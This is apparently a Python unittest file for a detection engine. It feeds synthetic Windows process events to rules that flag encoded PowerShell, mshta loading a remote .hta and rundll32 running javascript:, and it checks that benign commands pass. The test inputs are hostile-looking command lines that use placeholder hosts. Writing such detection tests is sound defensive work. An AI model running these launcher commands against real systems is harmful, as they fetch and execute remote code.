import unittest

from detections.detection_engine import analyze, detect_event


class DetectionEngineTests(unittest.TestCase):
    def test_encoded_powershell_matches(self):
        alerts = detect_event({
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -EncodedCommand SQBFAFgA",
            "User": "LAB\\analyst",
            "evidence_type": "synthetic",
        })
        self.assertEqual([a["rule_id"] for a in alerts], ["DE-001"])
        self.assertIn("T1059.001", alerts[0]["techniques"])

    def test_mshta_remote_url_matches(self):
        alerts = detect_event({
            "Image": r"C:\Windows\System32\mshta.exe",
            "CommandLine": "mshta.exe https://example.invalid/demo.hta",
            "evidence_type": "synthetic",
        })
        self.assertEqual([a["rule_id"] for a in alerts], ["DE-002"])

    def test_rundll32_javascript_matches(self):
        alerts = detect_event({
            "Image": r"C:\Windows\System32\rundll32.exe",
            "CommandLine": "rundll32.exe javascript:Start",
            "evidence_type": "synthetic",
        })
        self.assertEqual([a["rule_id"] for a in alerts], ["DE-003"])

    def test_benign_notepad_control_does_not_match(self):
        alerts = detect_event({
            "Image": r"C:\Windows\System32\notepad.exe",
            "CommandLine": "notepad.exe notes.txt",
            "evidence_type": "synthetic",
        })
        self.assertEqual(alerts, [])

    def test_standard_powershell_without_encoded_switch_does_not_match(self):
        alerts = detect_event({
            "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "CommandLine": "powershell.exe -NoProfile -File inventory.ps1",
            "evidence_type": "synthetic",
        })
        self.assertEqual(alerts, [])

    def test_analyze_ignores_non_object_entries(self):
        alerts = analyze([None, "not-an-event", {
            "Image": r"C:\Windows\System32\mshta.exe",
            "CommandLine": "mshta https://example.invalid/test.hta",
        }])
        self.assertEqual([a["rule_id"] for a in alerts], ["DE-002"])


if __name__ == "__main__":
    unittest.main()
